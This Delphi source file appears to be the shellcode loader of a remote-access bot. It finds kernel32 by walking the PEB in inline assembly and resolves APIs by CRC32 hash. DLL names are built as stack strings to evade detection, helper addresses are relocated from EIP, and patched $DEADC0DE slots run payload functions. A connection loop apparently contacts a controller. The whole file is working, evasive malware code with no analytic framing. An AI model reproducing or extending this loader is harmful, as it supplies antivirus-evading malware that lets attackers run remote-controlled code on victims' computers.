unit untLoader;

interface
uses Windows, untUtils, untConnection;
  
procedure resolver;
procedure resolver_start();
procedure resolver_end();
implementation
procedure resolver_start();
begin
  resolver();
end;

procedure resolver;

  procedure LoadFunctions(pAPI:PAPIRec);stdcall;
  var
    pFunctions:Array[0..2] of DWORD;
    xFunc:procedure(pAPI:PAPIRec);stdcall;
    i:Integer;
  begin
    pFunctions[0] := $DEADC0DE;
    pFunctions[1] := $DEADC0DE;
    pFunctions[2] := $DEADC0DE;
    for i := 0 to Length(pFunctions) - 1 do
    begin
      if DWORD(pFunctions[i]) <> $DEADC0DE then
      begin
        xFunc := Pointer(pFunctions[i]);
        xFunc(pAPI);
      end;
    end;
  end;

  function xCompressMemory(pAPI:PAPIRec; lpMemory: Pointer; var dwSize: Cardinal): Pointer;stdcall;
  var
    lpWorkspace, lpOutput: Pointer;
    dwTemp, dwOutputSize: DWORD;
  begin
    Result := nil;
    dwOutputSize := dwSize;
    lpOutput := pAPI.xVirtualAlloc(nil, dwSize, MEM_COMMIT, PAGE_READWRITE);
    if lpOutput <> nil then
    begin
      pAPI.xRtlGetCompressionWorkSpaceSize($00000002, @dwTemp, @dwOutputSize);
      lpWorkspace := pAPI.xVirtualAlloc(nil, dwTemp, MEM_COMMIT, PAGE_READWRITE);
      if lpWorkspace <> nil then
      begin
        dwTemp := 0;
        pAPI.xRtlCompressBuffer($00000002, lpMemory, dwSize, lpOutput, dwSize, 0, @dwTemp, lpWorkspace);
        if dwTemp <> 0 then
        begin
          pAPI.xVirtualFree(lpWorkspace, 0, MEM_RELEASE);
          dwSize := dwTemp;
          Result := lpOutput;
        end;
      end;
    end;
  end;

  function xDecompressMemory(pAPI:PAPIRec; lpMemory: Pointer; dwSize: Cardinal; dwOutputSize:Cardinal): Pointer;stdcall;
  var
    lpOutput: Pointer;
    dwTemp: DWORD;
  begin
    Result := nil;
    lpOutput := pAPI.xVirtualAlloc(nil, dwOutputSize, MEM_COMMIT, PAGE_READWRITE);
    if lpOutput <> nil then
    begin
      begin
        dwTemp := 0;
        pAPI.xRtlDecompressBuffer($00000002, lpOutput, dwOutputSize, lpMemory, dwSize, @dwTemp);
        if dwTemp <> 0 then
        begin
          Result := lpOutput;
        end;
      end;
    end;
  end;

  procedure Move( const Source; var Dest; count : Integer );
  var
    S, D: PChar;
    I: Integer;
  begin
    S := PChar(@Source);
    D := PChar(@Dest);
    if S = D then Exit;
    if Cardinal(D) > Cardinal(S) then
      for I := count-1 downto 0 do
        D[I] := S[I]
    else
      for I := 0 to count-1 do
        D[I] := S[I];
  end;

  procedure xCopyMemory(Destination: Pointer; Source: Pointer; Length: DWORD);stdcall;
  begin
    Move(Source^, Destination^, Length);
  end;

  procedure xZeroMemory(var Dest; count: Integer);stdcall;
  var
    I: Integer;
    P: PAnsiChar;
  begin
    P := PAnsiChar(@Dest);
    for I := count-1 downto 0 do
      P[I] := #0;
  end;

  function xAllocMem(pAPI:PAPIRec; dwSize:Cardinal):Pointer;stdcall;
  begin
    Result := pAPI.xVirtualAlloc(nil, dwSize, MEM_COMMIT, PAGE_READWRITE);
    xZeroMemory(Result^,dwSize);
  end;

  procedure xFreeMem(pAPI:PAPIRec; pData:Pointer);stdcall;
  begin
    pAPI.xVirtualFree(pData, 0, MEM_RELEASE);
  end;

  procedure LoadLib(pAPI:PAPIRec);stdcall;
  var
    strUser32:Array[0..10] of Char;
    strShell32:Array[0..11] of Char;
    strShFolder, strAdvapi32:Array[0..12] of Char;
    strNtdll:Array[0..12] of Char;
  begin
    strUser32[0]:='u';strUser32[1]:='s';strUser32[2] := 'e';strUser32[3]:='r';strUser32[4]:='3';strUser32[5]:='2';strUser32[6]:='.';strUser32[7]:='d';strUser32[8]:='l';strUser32[9]:='l';strUser32[10]:=#0;
    strShell32[0]:='s';strShell32[1]:='h';strShell32[2]:='e';strShell32[3]:='l';strShell32[4]:='l';strShell32[5]:='3';strShell32[6]:='2';strShell32[7]:='.';strShell32[8]:='d';strShell32[9]:='l';strShell32[10]:='l';strShell32[11]:=#0;
    strShFolder[0]:='s';strShFolder[1]:='h';strShFolder[2]:='f';strShFolder[3]:='o';strShFolder[4]:='l';strShFolder[5]:='d';strShFolder[6]:='e';strShFolder[7]:='r';strShFolder[8]:='.';strShFolder[9]:='d';strShFolder[10]:='l';strShFolder[11]:='l';strShFolder[12]:=#0;
    strAdvapi32[0]:='a';strAdvapi32[1]:='d';strAdvapi32[2]:='v';strAdvapi32[3]:='a';strAdvapi32[4]:='p';strAdvapi32[5]:='i';strAdvapi32[6]:='3';strAdvapi32[7]:='2';strAdvapi32[8]:='.';strAdvapi32[9]:='d';strAdvapi32[10]:='l';strAdvapi32[11]:='l';strAdvapi32[12]:=#0;
    strNtdll[0]:='n';strNtdll[1]:='t';strNtdll[2]:='d';strNtdll[3]:='l';strNtdll[4]:='l';strNtdll[5]:='.';strNtdll[6]:='d';strNtdll[7]:='l';strNtdll[8]:='l';strNtdll[9]:=#0;
    pAPI.hAdvapi32 := pAPI.xLoadLibraryW(@strAdvapi32[0]);
    pAPI.hUser32 := pAPI.xLoadLibraryW(@strUser32[0]);
    pAPI.hShell32 := pAPI.xLoadLibraryW(@strShell32[0]);
    pAPI.hShFolder := pAPI.xLoadLibraryW(@strShFolder[0]);
    pAPI.hNtdll := pAPI.xLoadLibraryW(@strNtdll[0]);
  end;

  function CalcCrc32(lpSource:PChar; nLength:Integer):Cardinal;stdcall;
  var
    Crc32Table: array[0..255] of Cardinal;
    I,J: Integer;
    crc: Cardinal;
  begin
    for I:=0 to 255 do
    begin
      crc := I;
      for J := 0 to 7 do
      begin
        if crc and 1 > 0 then
          crc := (crc shr 1) xor $EDB88320
        else
          crc := crc shr 1;
      end;
      Crc32Table[I] := crc;
    end;
    Result := $FFFFFFFF;
    for I := 0 to nLength-1 do
      Result := (Result shr 8) xor Crc32Table[PByte(Cardinal(lpSource) + i)^ xor (Result and $FF)];
    Result := not Result;
  end;

  function GetProcAddressEx(hBase, hHash, dwLen:Cardinal):Pointer;stdcall;
  var
    IDH: PImageDosHeader;
    INH: PImageNtHeaders;
    IED: PImageExportDirectory;
    i:  Integer;
    dwName: DWORD;
    wOrdinal: WORD;
  begin
    Result := nil;
    IDH := Pointer(hBase);
    INH := Pointer(hBase + IDH^._lfanew);
    IED := Pointer(hBase + INH^.OptionalHeader.DataDirectory[0].VirtualAddress);
    for i := 0 to IED^.NumberOfNames do
    begin
      dwName := (hBase + PDWORD(hBase + (DWORD(IED^.AddressOfNames) + (i * 4)))^);
      if (CalcCrc32(PChar(dwName), dwLen) = hHash) then
      begin
        wOrdinal := (PWORD(hBase + DWORD(IED^.AddressOfNameOrdinals) + (i * 2))^);
        Result := Pointer(hBase + (PDWORD(hBase + DWORD(IED^.AddressOfFunctions) + (wOrdinal * 4))^));
        break;
      end;
    end;
  end;

  procedure LoadHelpers(pAPI:PAPIRec);stdcall;
  var
    dwStaticAddress:Cardinal;
    dwLoadHelpers:Cardinal;
    dwEIP:Cardinal;
    dwRelativeAddress:Cardinal;
  begin
    asm
      call @getEIP
      @getEIP:
      pop eax
      mov dwEIP, eax
    end;
    dwEIP := dwEIP - 11;
    dwLoadHelpers := DWORD(@LoadHelpers);

    dwStaticAddress := DWORD(@GetProcAddressEx);
    dwRelativeAddress := dwEIP - (dwLoadHelpers - dwStaticAddress);
    pAPI.xGetProcAddressEx := Pointer(dwRelativeAddress);

    dwStaticAddress := DWORD(@xAllocMem);
    dwRelativeAddress := dwEIP - (dwLoadHelpers - dwStaticAddress);
    pAPI.xAllocMem := Pointer(dwRelativeAddress);

    dwStaticAddress := DWORD(@xFreeMem);
    dwRelativeAddress := dwEIP - (dwLoadHelpers - dwStaticAddress);
    pAPI.xFreeMem := Pointer(dwRelativeAddress);

    dwStaticAddress := DWORD(@xZeroMemory);
    dwRelativeAddress := dwEIP - (dwLoadHelpers - dwStaticAddress);
    pAPI.xZeroMemory := Pointer(dwRelativeAddress);

    dwStaticAddress := DWORD(@xCopyMemory);
    dwRelativeAddress := dwEIP - (dwLoadHelpers - dwStaticAddress);
    pAPI.xCopyMemory := Pointer(dwRelativeAddress);

    dwStaticAddress := DWORD(@xCompressMemory);
    dwRelativeAddress := dwEIP - (dwLoadHelpers - dwStaticAddress);
    pAPI.xCompressMemory := Pointer(dwRelativeAddress);

    dwStaticAddress := DWORD(@xDecompressMemory);
    dwRelativeAddress := dwEIP - (dwLoadHelpers - dwStaticAddress);
    pAPI.xDecompressMemory := Pointer(dwRelativeAddress);
  end;

  procedure LoadAPIs(pAPI:PAPIRec; hKernel32:Cardinal);
  begin
    pAPI.hKernel32 := hKernel32;
    pAPI.xLoadLibraryW := GetProcAddressEx(hKernel32, $CB1508DC, 12);
    LoadLib(pAPI);
    pAPI.xGetProcAddress := GetProcAddressEx(hKernel32, $C97C1FFF, 14);
    pAPI.xExitProcess := GetProcAddressEx(hKernel32, $251097CC, 11);
    pAPI.xMessageBoxW := GetProcAddressEx(pAPI.hUser32, $A3F9E8DF, 11);
    pAPI.xVirtualAlloc := GetProcAddressEx(hKernel32, $09CE0D4A, 12);
    pAPI.xVirtualFree := GetProcAddressEx(hKernel32, $CD53F5DD, 11);
    pAPI.xlstrlenW := GetProcAddressEx(hKernel32, $1DDA9F5D, 8);
    pAPI.xlstrcmpW := GetProcAddressEx(hKernel32, $9FEBE16C, 8);
    pAPI.xlstrcatW := GetProcAddressEx(hKernel32, $F29DDD0C, 8);
    pAPI.xwsprintfW := GetProcAddressEx(pAPI.hUser32, $201D0DD6, 9);
    pAPI.xRtlGetCompressionWorkSpaceSize := GetProcAddressEx(pAPI.hNtdll, $CBF9A7E9, 30);
    pAPI.xRtlCompressBuffer := GetProcAddressEx(pAPI.hNtdll, $9BFFF5D2, 17);
    pAPI.xRtlDeCompressBuffer := GetProcAddressEx(pAPI.hNtdll, $52FE26D8, 19);
  end;

var
  hModule:Cardinal;
  hKernel32:Cardinal;
  pAPI : PAPIRec;
  pVirtualAlloc:function(lpvAddress: Pointer; dwSize, flAllocationType, flProtect: DWORD): Pointer; stdcall;
begin
  asm
    MOV EAX, FS:[30h]
    MOV EAX, [EAX+0Ch]
    MOV EAX, [EAX+0Ch]
    MOV EAX, [EAX]
    MOV EAX, [EAX]
    MOV EAX, [EAX+18h]
    MOV hKernel32, EAX
    CALL @GetImageBase
    @GetImageBase:
    POP EAX
    AND EAX, 0FFFF0000h
    MOV hModule, EAX
  end;
  @pVirtualAlloc := GetProcAddressEx(hKernel32, $09CE0D4A, 12);
  pAPI := pVirtualAlloc(nil, SizeOf(TAPIRec) , MEM_COMMIT, PAGE_READWRITE);
  LoadAPIs(pAPI, hKernel32);
  LoadHelpers(pAPI);
  ConnectionLoop_CALLER(pAPI);
  LoadFunctions(pAPI);
  pAPI.xExitProcess(0);
end;
procedure resolver_end(); asm end;
end.
